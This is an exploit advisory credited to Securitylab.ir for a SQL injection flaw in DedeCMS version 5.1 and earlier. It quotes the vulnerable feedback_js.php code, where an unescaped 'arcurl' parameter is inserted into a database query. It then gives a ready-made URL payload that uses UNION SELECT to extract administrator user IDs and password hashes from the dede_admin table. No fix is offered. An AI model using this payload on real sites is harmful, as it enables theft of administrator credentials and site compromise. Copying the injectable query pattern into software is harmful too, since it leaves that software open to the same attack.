DedeCMS <= 5.1 SQL Injection
============================

######################### Securitylab.ir ########################
# Application Info:
# Name: DEDECMS
# Version: 5.1
#################################################################
# Discoverd By: Securitylab.ir
#################################################################
# Vulnerability Info:
# Type: Sql Injection Vulnerability
# Risk: Medium
#===========================================================
# feedback_js.php
$urlindex = 0;
if(empty($arcID))
{
$row = $dlist->dsql->GetOne("Select id From `#@__cache_feedbackurl` where url=&#039;$arcurl&#039; ");
 if(is_array($row)) $urlindex = $row[&#039;id&#039;];
}
if(empty($arcID) && empty($urlindex)) exit();
......
if(empty($arcID)) $wq = " urlindex = &#039;$urlindex&#039; ";
else $wq = " aid=&#039;$arcID&#039; ";
 $querystring = "select * from `#@__feedback` where $wq and ischeck=&#039;1&#039; order by dtime desc";
$dlist->Init();
$dlist->SetSource($querystring);
...
# http://site.com/[PATH]/plus/feedback_js.php?arcurl=&#039; union select "&#039; and 1=2 union select 1,1,1,userid,3,1,3,3,pwd,1,1,3,1,1,1,1,1 from dede_admin where 1=1 union select * from dede_feedback where 1=2 and &#039;&#039;=&#039;" from dede_admin where &#039;&#039;=
#===========================================================



